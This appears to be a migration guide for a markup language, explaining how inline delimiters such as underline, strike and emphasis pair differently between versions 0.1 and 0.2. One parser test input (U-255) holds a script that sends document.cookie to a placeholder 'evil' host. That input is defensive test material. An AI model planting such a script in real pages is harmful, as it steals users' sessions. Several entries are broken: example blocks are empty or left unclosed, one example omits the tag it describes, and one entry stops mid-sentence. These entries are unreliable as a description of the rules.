# Emphasis and inline marks {#inline}

Bare `_`, `~` and `=` pairs collided with prose and identifiers such as `snake_case`, `~/config` and `x =1, y= 2`. In 0.2 only `/` and `*` pair bare; underline, strike and highlight use the braced forms `{_x_}`, `{~x~}` and `{=x=}` ([technical rationale](../technical-rationale#reduce-punctuation-collisions), C2-I-043, C2-I-046).

**U-065** <Badge type="tip" text="rewrite" /> <Badge type="warning" text="silent" /> In 0.1, `_underlined_` writes an underline, and `_z_/y/` writes an underline followed by literal `/y/`.

::: compare no-render
```text
an _underlined_ word and snake_case and _id
```
```crv
an {_underlined_} word and snake_case and _id
```
:::

**U-066** <Badge type="tip" text="rewrite" /> <Badge type="warning" text="silent" /> Bare strike

::: compare no-render
```text

```

```crv
a {~struck~} word and ~/config
```
:::


**U-145** <Badge type="danger" text="report" /> <Badge type="warning" text="silent" /> Under C2-I-047,C2-I-048,C2-I-051: in 0.1, `/*//` writes `<p><em>*</em>/</p>`. The 0.1 reading of `/***/` nests strong and emphasis around a star.

**U-151** <Badge type="danger" text="report" /> <Badge type="warning" text="silent" /> Under C2-I-050,C2-I-052: in 0.1, `_{_` writes `<p><u>{</u></p>`.

**U-170** <Badge type="danger" text="report" /> <Badge type="warning" text="silent" /> Under C2-I-092: in 0.1, `@a-` (and the tag #x-) writes `<p><span class="mention"><strong>@a-</strong></span></p>`.
Tool: Review.

::: compare no-render
```text
@a-
```
```text
<p><span class="mention"><strong>@a</strong></span>-</p> C2-I-092 ends a mention or tag name before a trailing hyphen, which is text behind it; 0.1 kept the hyphen in the name. A tag does the same: `#x-` writes `<p><span class="tag"><strong>#x</strong></span>-</p>`, where 0.1 wrote `<strong>#x-</strong>`. No 0.2 name ends with a hyphen, so no spelling keeps the 0.1 HTML.
```
:::

Tool: Review the replacement.

```text
C2-I-062 has no arrow replacement, and C2-W-116 gives an empty insertion or deletion no spelling.
```

**U-240** <Badge type="danger" text="report" /> <Badge type="warning" text="silent" /> Under C2-I-030, `[a]{:abcdefgh} [b]{:abcdefghi}` writes a language span for `a` and literal `[b]{:abcdefghi}` in 0.1.
Tool: Review the new language span.

::: compare no-render

```text

```

**U-254** <Badge type="danger" text="report" /> <Badge type="warning" text="silent" /> Under C2-I-023, C2-I-043, and C2-I-047, `/{+a/{k=b+}` writes a literal slash and an insertion, while `/x /*a %% b*/{.c} y` writes nested emphasis and strong text in 0.1.
Tool: Review delimiter and comment ownership.

::: compare no-render
```text
/{+a/{k=b+}
 or /x /*a %% b*/{.c} y
```
```text
C2-I-023, C2-I-043, and C2-I-047 change delimiter pairing when an attribute opener or a line comment intervenes.
```
:::

**U-255** <Badge type="danger" text="report" /> <Badge type="warning" text="silent" /> Under C2-I-047, two escaped HTML tags containing `http://` and `fetch("//evil/?")` pair slash delimiters around the text from `iframe` to `fetch` in 0.1.
Tool: Review the escaped text emphasis boundary.

::: compare no-render
```text

<script>fetch("//evil/?" + document.cookie)</script>
```

**U-365** <Badge type="tip" text="rewrite" /> <Badge type="warning" text="silent" /> Under C2-I-005, C2-I-035 and C2-I-119, a valid attribute block inside a braced span that holds the span's closer: `{-{#x-}`; the underline `{_{#x_}`

**U-374** <Badge type="danger" text="report" /> <Badge type="warning" text="silent" /> Nested braced boundaries: `{-{_a-}_} b-}` and `{-a-}{+{+b~}+}+}`
Tool: C2-I-058 and C2-I-059 pair the first matching closer and remove later openers, changing the nesting and HTML. Review the nested marks.

::: compare no-render
```text
{-{_a-}_} b-}
```
```text
At nested braced boundaries, C2-I-058 and C2-I-059 pair the first matching closer and remove later openers from the delimiter stack. The 0.1 HTML nests an underline inside deletion for this input; 0.2 does not, because the inner underline opener is removed when the outer deletion closes. The same boundary rule governs `{-a-}{+{+b~}+}+}`. No source rewrite is promised; review the nesting.
```
:::

**U-389** <Badge type="danger" text="report" /> <Badge type="warning" text="silent" /> A braced underline right after an equals sign: `={_a=b_}`. 0.1 writes `=<u>a=b</u>`; 0.2 writes the whole run as text.
Tool: Report from the outer equals sign through the final closing brace.

::: compare no-render
```text
={_a=b_}
```
```text
<p>={_a=b_}</p> The braced opener and its nested closer pair differently under C2-I-035 and C2-I-043. Report the source range from the outer equals sign through the final closing brace.
```
:::
